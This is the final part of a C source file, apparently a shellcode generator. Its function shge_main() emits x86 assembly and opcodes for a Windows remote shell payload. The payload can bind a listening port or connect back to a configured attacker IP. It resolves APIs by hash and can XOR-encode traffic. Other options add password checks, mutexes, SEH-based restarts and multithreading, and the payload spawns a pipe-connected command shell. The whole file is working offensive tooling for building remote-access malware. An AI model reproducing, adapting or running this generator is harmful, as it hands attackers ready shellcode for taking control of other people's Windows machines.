    ctx->v_wp2              = add_v(ctx,ctx->x_wp2,"DWORD",4);
  }
  ctx->v_io_socket        = add_v(ctx,ctx->x_io_socket,"DWORD",4);
  if (!ctx->opt->BACKCONNECT)
  {
    ctx->v_listen_socket  = add_v(ctx,ctx->x_listen_socket,"DWORD",4);
  }
  if (!ctx->opt->DIRECT_API)
  {
    ctx->v_ptr2callbyhash = add_v(ctx,ctx->x_ptr2callbyhash,"DWORD",4);
    ctx->v_ws2_base       = add_v(ctx,ctx->x_ws2_base,"DWORD",4);
    if (ctx->opt->USE_LASTCALL)
    {
      ctx->v_lastcall       = add_v(ctx,ctx->x_lastcall,"DWORD",4);
    }
  }
  if (!ctx->opt->NOSHELL)
  {
    ctx->v_processinfo      = add_v(ctx,ctx->x_processinfo,"DWORD:4",16);
  }
  if (ctx->opt->INACT != 0)
  {
    ctx->v_alive          = add_v(ctx,ctx->x_alive,"DWORD",4);
  }
  if (!ctx->opt->ALLOC_BUF)
  {
    sprintf(s,"BYTE:%s", ctx->c_MAXBUFSIZE);
    ctx->v_buf            = add_v(ctx,ctx->x_buf,s, ctx->opt->MAXBUFSIZE);
  }

  add(ctx,";consts");

  add_c_str(ctx,ctx->c_stack_size,ctx->opt->ALLOC_BUF?ctx->x_processinfo:ctx->x_buf,NULL);

  if (ctx->opt->DIRECT_API == 0)
  {
    add_c(ctx,ctx->c_K32_ID,ctx->opt->K32_ID,NULL,2);
    add_c(ctx,ctx->c_WS2_ID,ctx->opt->WS2_ID,NULL,2);
  }
  add_c(ctx,ctx->c_MAXBUFSIZE,ctx->opt->MAXBUFSIZE,NULL,-1);
  if (ctx->opt->BACKCONNECT)
  {
    add_c(ctx,ctx->c_RECONNECT_MS,ctx->opt->RECONNECT_MS,NULL,-1);
  }
  if (ctx->opt->XORBYTE != 0)
  {
    add_c(ctx,ctx->c_XORBYTE,ctx->opt->XORBYTE,NULL,2);
  }

  if ((!ctx->opt->BACKCONNECT) || (!ctx->opt->BC2HOST))
  {
    sprintf(s,"== %d.%d.%d.%d",
              (ctx->opt->IP_ADDR)&0xFF,
              (ctx->opt->IP_ADDR>>8)&0xFF,
              (ctx->opt->IP_ADDR>>16)&0xFF,
              (ctx->opt->IP_ADDR>>24)&0xFF );
    add_c(ctx,ctx->c_IP_ADDR,ctx->opt->IP_ADDR,s,8);
  }

  add_c(ctx,ctx->c_SHELL_PORT,ctx->opt->SHELL_PORT,NULL,-1);

  if (ctx->opt->INACT != 0)
  {
    add_c(ctx,ctx->c_INACTIVITY,ctx->opt->INACT,"inactivity timeout, [sec]",-1);
  }

  add(ctx,";api");

  if (ctx->opt->ALLOC_BUF)
  {
    add_x(ctx,ctx->a_K32_GlobalAlloc,ctx->opt->API_K32_GlobalAlloc,"used only if ALLOC_BUF");
    add_x(ctx,ctx->a_K32_GlobalFree,ctx->opt->API_K32_GlobalFree,"used only if ALLOC_BUF");
  }
  if (ctx->opt->MULTITHREAD)
  {
    add_x(ctx,ctx->a_K32_CreateThread,ctx->opt->API_K32_CreateThread,"used only if MULTITHREAD");
    add_x(ctx,ctx->a_K32_ExitThread,ctx->opt->API_K32_ExitThread,"used only if MULTITHREAD");
  }

  if (ctx->opt->MULTITHREAD || !ctx->opt->NOSHELL)
  {
    add_x(ctx,ctx->a_K32_CloseHandle,ctx->opt->API_K32_CloseHandle,"used if MULTITHREAD || !NOSHELL");
  }
  if (!ctx->opt->NOSHELL)
  {
    add_x(ctx,ctx->a_K32_CreatePipe,ctx->opt->API_K32_CreatePipe,"used only if !NOSHELL");
    add_x(ctx,ctx->a_K32_CreateProcessA,ctx->opt->API_K32_CreateProcessA,"used only if !NOSHELL");
    add_x(ctx,ctx->a_K32_GetExitCodeProcess,ctx->opt->API_K32_GetExitCodeProcess,"used only if !NOSHELL");
    add_x(ctx,ctx->a_K32_PeekNamedPipe,ctx->opt->API_K32_PeekNamedPipe,"used only if !NOSHELL");
    add_x(ctx,ctx->a_K32_ReadFile,ctx->opt->API_K32_ReadFile,"used only if !NOSHELL");
    add_x(ctx,ctx->a_K32_WriteFile,ctx->opt->API_K32_WriteFile,"used only if !NOSHELL");
    add_x(ctx,ctx->a_K32_TerminateProcess,ctx->opt->API_K32_TerminateProcess,"used only if !NOSHELL");
  }
//  if (ctx->opt->SNIPPET && ctx->opt->USE_LASTCALL)
//  {
//    add_x(ctx,ctx->a_K32_GetProcAddress,ctx->opt->API_K32_GetProcAddress,"used only if SNIPPET && LASTCALL");
//  }
  if (ctx->opt->USE_MUTEX)
  {
    add_x(ctx,ctx->a_K32_CreateMutexA,ctx->opt->API_K32_CreateMutexA,"used only if USE_MUTEX");
    add_x(ctx,ctx->a_K32_GetLastError,ctx->opt->API_K32_GetLastError,"used only if USE_MUTEX");
    add_x(ctx,ctx->a_K32_WaitForSingleObject,ctx->opt->API_K32_WaitForSingleObject,"used only if USE_MUTEX");
  }
  add_x(ctx,ctx->a_K32_LoadLibraryA,ctx->opt->API_K32_LoadLibraryA,"used always");
  if (ctx->opt->SUPPORT_WIN9X)
  {
    add_x(ctx,ctx->a_K32_GetVersion,ctx->opt->API_K32_GetVersion,"used only if SUPPORT_WIN9X");
  }
  if (ctx->opt->INACT != 0)
  {
    add_x(ctx,ctx->a_K32_GetTickCount,ctx->opt->API_K32_GetTickCount,"used only if INACT != 0");
  }
  if (ctx->opt->BACKCONNECT)
  {
    if (ctx->opt->RECONNECT_MS != 0)
      add_x(ctx,ctx->a_K32_Sleep,ctx->opt->API_K32_Sleep,"used only if BACKCONNECT && RECONNECT_MS != 0");
    add_x(ctx,ctx->a_WS2_connect,ctx->opt->API_WS2_connect,"used only if BACKCONNECT");
    if (ctx->opt->BC2HOST)
      add_x(ctx,ctx->a_WS2_gethostbyname,ctx->opt->API_WS2_gethostbyname,"used only if BACKCONNECT && BC2HOST");
  }
  else
  {
    add_x(ctx,ctx->a_WS2_bind,ctx->opt->API_WS2_bind,"used only if not BACKCONNECT");
    add_x(ctx,ctx->a_WS2_listen,ctx->opt->API_WS2_listen,"used only if not BACKCONNECT");
    add_x(ctx,ctx->a_WS2_accept,ctx->opt->API_WS2_accept,"used only if not BACKCONNECT");
  }
  if (ctx->opt->DO_WSA_STARTUP)
  {
    add_x(ctx,ctx->a_WS2_WSAStartup,ctx->opt->API_WS2_WSAStartup,"used only if DO_WSA_STARTUP");
  }
  if (ctx->opt->DO_REUSEADDR)
  {
    add_x(ctx,ctx->a_WS2_setsockopt,ctx->opt->API_WS2_setsockopt,"used only if DO_REUSEADDR");
  }
  add_x(ctx,ctx->a_WS2_socket,ctx->opt->API_WS2_socket,"used always");
  add_x(ctx,ctx->a_WS2_closesocket,ctx->opt->API_WS2_closesocket,"used always");
  add_x(ctx,ctx->a_WS2_send,ctx->opt->API_WS2_send,"used always");
  add_x(ctx,ctx->a_WS2_recv,ctx->opt->API_WS2_recv,"used always");
  add_x(ctx,ctx->a_WS2_select,ctx->opt->API_WS2_select,"used always");

  if (ctx->opt->MACRO_CALL)
  {
    add(ctx,";macros, using %s syntax", ctx->opt->SYNTAX==0?"TASM/MASM":"NASM");

    if (ctx->opt->DIRECT_API)
    {
      if (ctx->opt->SYNTAX == 0)
      {
        add(ctx,";$%s macro offs", ctx->m_callK32);
        add(ctx,";$                mov     eax, offs");
        add(ctx,";$                call    eax");
        add(ctx,";$endm");
        add(ctx,";$%s macro offs", ctx->m_callWS2);
        add(ctx,";$                mov     eax, offs");
        add(ctx,";$                call    eax");
        add(ctx,";$endm");
      }
      else
      {
        add(ctx,";$%%macro          %s 1", ctx->m_callK32);
        add(ctx,";$                mov     eax, %%1");
        add(ctx,";$                call    eax");
        add(ctx,";$%%endm");
        add(ctx,";$%%macro          %s 1", ctx->m_callWS2);
        add(ctx,";$                mov     eax, %%1");
        add(ctx,";$                call    eax");
        add(ctx,";$%%endm");
      }
    }
    else
    {
      if (ctx->opt->SYNTAX == 0)
      {
        add(ctx,";$%s macro hash", ctx->m_callK32);
        add(ctx,";$                call    $DP [ebp-%s]", ctx->x_ptr2callbyhash);
        add(ctx,";$                db      %s", ctx->c_K32_ID);
        add(ctx,";$                dd      hash");
        add(ctx,";$endm");
        add(ctx,";$%s macro hash", ctx->m_callWS2);
        add(ctx,";$                call    $DP [ebp-%s]", ctx->x_ptr2callbyhash);
        add(ctx,";$                db      %s", ctx->c_WS2_ID);
        add(ctx,";$                dd      hash");
        add(ctx,";$endm");
      }
      else
      {
        add(ctx,";$%%macro          %s 1", ctx->m_callK32);
        add(ctx,";$                call    $DP [ebp-%s]", ctx->x_ptr2callbyhash);
        add(ctx,";$                db      %s", ctx->c_K32_ID);
        add(ctx,";$                dd      %%1");
        add(ctx,";$%%endm");
        add(ctx,";$%%macro          %s 1", ctx->m_callWS2);
        add(ctx,";$                call    $DP [ebp-%s]", ctx->x_ptr2callbyhash);
        add(ctx,";$                db      %s", ctx->c_WS2_ID);
        add(ctx,";$                dd      %%1");
        add(ctx,";$%%endm");
      }
    }
  }

  // generate code

  add(ctx,";body");

  add(ctx,";- arguments are [ebp-xx]");
  add(ctx,";- %s is size of all local variables, in BYTEs",ctx->c_stack_size);
  add(ctx,";- EBX is always 0");
  add(ctx,";- EDI always points to IO buffer");
  add(ctx,";- if we use upx-like compression on the binary code, we dont optimize");
  add(ctx,";  code much, moreover, using MACROs and repeated instructions is sometimes");
  add(ctx,";  better than creating subroutines, since then is better packed");

  add_struct(ctx,"plain_code");
  add_struct(ctx,"{");

  add_struct(ctx,"initialize stack frame;");

  add(ctx,"C8%04X00|enter %s,0;alloc stack frame", DW(ctx->v_stack_size),ctx->c_stack_size);

  if (ctx->opt->USE_SEH)
  {
    add(ctx,"%s:;seh restart handler", ctx->l___restart_main__);
  }

  add(ctx,"33DB|xor ebx,ebx;always zero");

  if (ctx->opt->USE_SEH)
  {
    add_struct(ctx,"main seh handler (on error retry from here);");

    M_SEH(ctx,ctx->l___init_seh__,ctx->l___restart_main__);

  } // USE_SEH

  add_struct(ctx,"initialize variables (main);");

  M_INIT(ctx, 0, ctx->l___pop_ptr2callbyhash__,ctx->l___pushed__);

  if (ctx->opt->USE_MUTEX)
  {
    add_struct(ctx,"check if mutex exists/call WaitForSingleObject();");

    M_MUTEX(ctx);

  } // USE_MUTEX

  add_struct(ctx,"[1]");

  add(ctx,"%s:",ctx->l___create_socket__);

  if (ctx->opt->BACKCONNECT)
  {
    add_struct(ctx, "create io_socket;");

    M_SOCKET_WSA(ctx,ctx->x_io_socket,ctx->v_io_socket);

    M_CONNECT(ctx, ctx->l___tempghbn__);

  }
  else // !BACKCONNECT
  {
    add_struct(ctx, "close listen_socket;");

    M_CLOSE_SOCKET(ctx,ctx->x_listen_socket,ctx->v_listen_socket);

    add_struct(ctx, "create listen_socket;");

    M_SOCKET_WSA(ctx,ctx->x_listen_socket,ctx->v_listen_socket);

    if (ctx->opt->DO_REUSEADDR)
    {
      add_struct(ctx, "setsockopt(SO_REUSEADDR);");

      M_SETSOCKOPT(ctx);

    } // DO_REUSEADDR

    M_BIND_LISTEN(ctx,ctx->l___create_socket__,ctx->l___tempghbn__);

    add(ctx,"%s:", ctx->l___accept__);

    add_struct(ctx, "[2]");
    add_struct(ctx, "accept connection;");

    M_ACCEPT(ctx,ctx->l___end_io_socket__);

    if (ctx->opt->MULTITHREAD)
    {
      add_struct(ctx, "create new thread;");

      M_CREATE_THREAD(ctx,ctx->l___thread__);

      if (ctx->opt->VAR_PORT)
      {
        add_struct(ctx, "goto [1];");
        add(ctx,"jmp %s;--> close %s, listen on next port", ctx->l___create_socket__, ctx->x_listen_socket);
      }
      else // !VAR_PORT
      {
        add_struct(ctx, "goto [2];");
        add(ctx,"jmp %s;--> continue listen on same port",ctx->l___accept__);
      }

      add_struct(ctx, "new_thread");
      add_struct(ctx, "{");

      add(ctx,"%s:", ctx->l___thread__);

      add(ctx,";same prolog as in main subroutine");

      add_struct(ctx,"initialize stack frame;");

      add(ctx,"C8%04X00|enter %s,0;alloc stack frame", DW(ctx->v_stack_size),ctx->c_stack_size);

      add(ctx,"33DB|xor ebx,ebx;always zero");

      if (ctx->opt->USE_SEH_TH)
      {
        add_struct(ctx,"thread seh handler, on error goto [9];");
        M_SEH(ctx,ctx->l___init_seh__th__,ctx->l___end_thread__);
        delta = 8;
      }
      else
      {
        delta = 0;
      }

      add_struct(ctx,"initialize variables, thread arg = socket handle;");

      M_INIT(ctx, 0, ctx->l___pop_ptr2callbyhash__th__,ctx->l___pushed__th__);

      add(ctx,";copy thread_arg into %s var",ctx->x_io_socket);

      if (4+ctx->v_stack_size+4+delta >= 128)
        add(ctx,"8B8424%08X|mov eax,[esp+4+%s+4+%d]",
          DD(4+ctx->v_stack_size+4+delta),
          ctx->c_stack_size,
          delta);
      else
        add(ctx,"8B4424%02X|mov eax,[esp+4+%s+4+%d]",
          4+ctx->v_stack_size+4+delta,
          ctx->c_stack_size,
          delta);

      M_mov_v_eax(ctx,ctx->x_io_socket,ctx->v_io_socket,"");

    } // MULTITHREAD
  } // !BACKCONNECT

  if (ctx->opt->PROMPT)
  {
    add_struct(ctx,"send prompt string to socket;");

    if (ctx->opt->USE_XPUSH_STRINGS)
    {
      X_PUSH(ctx,ctx->opt->str_prompt,0);
      add(ctx,"8BCC|mov ecx,esp;ECX=ptr to prompt string");
    }

    add(ctx,";send PROMPT to socket");

    add(ctx,"53|push ebx;0");

    i = strlen(ctx->opt->str_prompt);
    if (i >= 128)
      add(ctx,"68%08X|push %d;strlen(prompt)",DD(i),i);
    else
      add(ctx,"6A%02X|push %d;strlen(prompt)",DB(i),i);

    if (ctx->opt->USE_XPUSH_STRINGS)
      add(ctx,"51|push ecx;prompt string");
    else
    {
      add(ctx,"call %s;ptr to prompt string",ctx->l___pop_prompt__);
      X_DB(ctx,ctx->opt->str_prompt,0);
      add(ctx,"%s:",ctx->l___pop_prompt__);
    }

    M_push_v(ctx,ctx->x_io_socket,ctx->v_io_socket,"");
    callWS2(ctx,"send");

    if (ctx->opt->USE_XPUSH_STRINGS)
    {
      X_POP(ctx);
    } // !USE_XPUSH_STRINGS

    add(ctx,"40|inc eax;SOCKET_ERROR?");
    add(ctx,"jz %s", ctx->l___end_io_socket__);

  } // PROMPT

  if (ctx->opt->AUTH)
  {
    add_struct(ctx,"recv password string from socket;");

    add(ctx,";recv PASSWORD from socket");

    add(ctx,"53|push ebx;flags==0");

    i = strlen(ctx->opt->str_auth);
    if (i>=128)
      add(ctx,"68%08X|push %d;strlen(password)",DD(i),i);
    else
      add(ctx,"6A%02X|push %d;strlen(password)",DB(i),i);

    add(ctx,"57|push edi;ptr to io buffer");
    M_push_v(ctx,ctx->x_io_socket,ctx->v_io_socket,"");
    callWS2(ctx,"recv");

    if (i>=128)
      add(ctx,"3D%08X|cmp eax,%d;check password length",DD(i),i);
    else
      add(ctx,"83F8%02X|cmp eax,%d;check password length",DB(i),i);
    add(ctx,"jnz %s;--> close conn", ctx->l___end_io_socket__);

    add(ctx,"91|xchg ecx,eax;ECX=strlen(password)");

    if (ctx->opt->USE_XPUSH_STRINGS)
    {
      X_PUSH(ctx,ctx->opt->str_auth,0);
      add(ctx,"8BF4|mov esi,esp;ESI=ptr to password string");
    }
    else // !USE_XPUSH_STRINGS
    {
      add(ctx,"call %s;ptr to password string",ctx->l___pop_pass__);
      X_DB(ctx,ctx->opt->str_auth,0);
      add(ctx,"%s:",ctx->l___pop_pass__);
      add(ctx,"5E|pop esi");
    } // !USE_XPUSH_STRINGS

    add(ctx,";compare data");

    add(ctx,"57|push edi");
    add(ctx,"F3A6|repz cmpsb;CLD in the INIT part");
    add(ctx,"5F|pop edi");

    if (ctx->opt->USE_XPUSH_STRINGS)
    {
      X_POP_KEEPFLAGS(ctx);
    } // !USE_XPUSH_STRINGS

    add(ctx,"jnz %s;bad password? --> close conn", ctx->l___end_io_socket__);

    add_struct(ctx,"if password wrong, goto [5];");

  } // AUTH

  if (!ctx->opt->NOSHELL)
  {
    add_struct(ctx, "[3]");

    add(ctx, "%s:", ctx->l___exec_shell__);

    if (ctx->opt->DONT_DROP)
    {
      add_struct(ctx,"if shell is NOT running");
      add_struct(ctx,"{");

      add(ctx,";check if shell already executed and we have");
      add(ctx,";opened pipe handles to attach to");

      if (ctx->v_rp1 > 128)
        add(ctx,"399D%08X|cmp [ebp-%s],ebx",DD(-ctx->v_rp1),ctx->x_rp1);
      else
        add(ctx,"395D%02X|cmp [ebp-%s],ebx",DB(-ctx->v_rp1),ctx->x_rp1);

      add(ctx,"jnz %s", ctx->l___shell_cycle__);

    } // DONT_DROP

    add(ctx,";create pipes & exec shell");

    add_struct(ctx,"create pipes and exec shell;");

    M_RUN_SHELL(ctx,ctx->l___end_shell__);

  } // !NOSHELL

  add(ctx,";main io cycle, including data xor (if %s defined)",ctx->c_XORBYTE);

  if (!ctx->opt->NOSHELL)
  {

    if (ctx->opt->DONT_DROP)
      add_struct(ctx,"}");

    add(ctx,"%s:", ctx->l___shell_cycle__);
  }

  M_SHELL_CYCLE(ctx,ctx->l___end_shell__,ctx->l___end_io_socket__);


  if (!ctx->opt->NOSHELL && ctx->opt->DONT_DROP)
  {
    add_struct(ctx,"[4]");
    add_struct(ctx,"terminate shell/close handles;");
    add_struct(ctx,"goto [3];");

    add(ctx,"%s:", ctx->l___end_shell__);
    add(ctx,";shell died, conn exists, --> restart shell");

    if (ctx->opt->SUB_KILLSHELL)
      add(ctx,"call %s", ctx->l___kill_shell__);
    else
      M_KILL_SHELL(ctx);

    add(ctx,"jmp %s", ctx->l___exec_shell__);

    add_struct(ctx,"[5]");
    add_struct(ctx,"close io_socket;");

    add(ctx,"%s:", ctx->l___end_io_socket__);
    add(ctx,";conn dropped, shell exists");

    M_CLOSE_SOCKET(ctx,ctx->x_io_socket,ctx->v_io_socket);

  }
  else // !DONT_DROP
  {
    if (!ctx->opt->NOSHELL)
    {
      add_struct(ctx,"[4]");

      add(ctx,";whatever dropped, shell or conn, kill both");
      add(ctx,"%s:", ctx->l___end_shell__);
    }

    add_struct(ctx,"[5]");
    add_struct(ctx,"close io_socket;");

    add(ctx,"%s:", ctx->l___end_io_socket__);

    if (!ctx->opt->NOSHELL)
    {
      add_struct(ctx,"terminate shell/close handles;");

      if (ctx->opt->SUB_KILLSHELL)
        add(ctx,"call %s", ctx->l___kill_shell__);
      else
        M_KILL_SHELL(ctx);
    }

    M_CLOSE_SOCKET(ctx,ctx->x_io_socket,ctx->v_io_socket);

  } // !DONT_DROP

  if (ctx->opt->BACKCONNECT)
  {
    add_struct(ctx,"goto [1]");

    add(ctx,"jmp %s;--> connect again", ctx->l___create_socket__);
  }
  else // !BACKCONNECT
  {
    if (ctx->opt->MULTITHREAD)
    {

      if (!ctx->opt->NOSHELL && ctx->opt->DONT_DROP)
      {

        add_struct(ctx,"terminate shell/close handles;");

        add(ctx,";shell exists, but we're multithread, so we cant reattach");
        add(ctx,";since listen/accept are in main thread");

        if (ctx->opt->SUB_KILLSHELL)
          add(ctx,"call %s", ctx->l___kill_shell__);
        else
          M_KILL_SHELL(ctx);

      } // !NOSHELL && DONT_DROP

      if (ctx->opt->ALLOC_BUF)
      {
        M_FREEBUF(ctx);
      }

      add_struct(ctx,"[9]");
      add(ctx,"%s:;exit from thread", ctx->l___end_thread__);

      M_EXITTHREAD(ctx);

      add_struct(ctx,"terminate thread;");
      add_struct(ctx,"} // new_thread");

    }
    else // !MULTITHREAD
    {
      if (ctx->opt->VAR_PORT)
      {
        add_struct(ctx,"goto [1]");
        add(ctx,"jmp %s;--> listen on next port", ctx->l___create_socket__);
      }
      else
      {
        add_struct(ctx,"goto [2];");
        add(ctx,"jmp %s;--> accept on same port", ctx->l___accept__);
      }
    } // !MULTITHREAD
  } // !BACKCONNECT

  if (!ctx->opt->DIRECT_API)
  {
    add_struct(ctx,"call_by_hash();");

    add(ctx,"%s:", ctx->l___call_by_hash__);

    M_CALL_BY_HASH(ctx);

  } // !DIRECT_API

  if (!ctx->opt->NOSHELL)
    M_CREATE_PIPE(ctx, 1, ctx->x_wp1, ctx->v_wp1, ctx->x_rp1, ctx->v_rp1, ctx->l___end_shell__);

  M_INIT(ctx, 1, ctx->l___pop_ptr2callbyhash__,ctx->l___pushed__);

  if (!ctx->opt->NOSHELL)
  if (ctx->opt->SUB_KILLSHELL)
  {
    add_struct(ctx, "kill_shell();");

    add(ctx,"%s:", ctx->l___kill_shell__);
    M_KILL_SHELL(ctx);
    add(ctx,"C3|retn");
  }

  if (!ctx->opt->DIRECT_API)
  if (ctx->opt->USE_OLDWAY_2FIND_K32)
  if (ctx->opt->SUB_FINDBASE)
  {
    add_struct(ctx, "find_base();");
    M_FINDBASE(ctx,2,ctx->l___fb_start_1__,ctx->l___fb_cycle_1__);
  }

  add_struct(ctx,"} // plain_code");

} /* shge_main() */

/* EOF */
